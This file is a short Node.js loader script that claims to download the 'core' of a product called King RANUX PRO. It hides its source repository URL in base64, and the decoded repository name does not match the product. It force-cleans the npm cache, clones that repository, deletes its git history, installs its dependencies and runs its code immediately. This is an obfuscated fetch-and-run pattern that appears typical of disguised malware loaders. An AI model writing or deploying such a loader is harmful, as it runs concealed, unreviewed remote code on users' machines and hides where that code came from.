const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

const ENCODED = "aHR0cHM6Ly9naXRodWIuY29tL3J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0";
const CORE_URL = Buffer.from(ENCODED, "base64").toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

try {
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  fs.rmSync(CORE_DIR, { recursive: true, force: true });
}

console.log("Downloading latest King RANUX PRO core...");

try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
} catch {
  console.log("Failed to download core");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
}

if (!fs.existsSync(path.join(CORE_DIR, "node_modules"))) {
  execSync(`cd core && npm install`, { stdio: "inherit" });
}

if (!fs.existsSync(path.join(__dirname, "config.js"))) {
  console.log("config.js not found");
  process.exit(1);
}

require("./core/index.js");
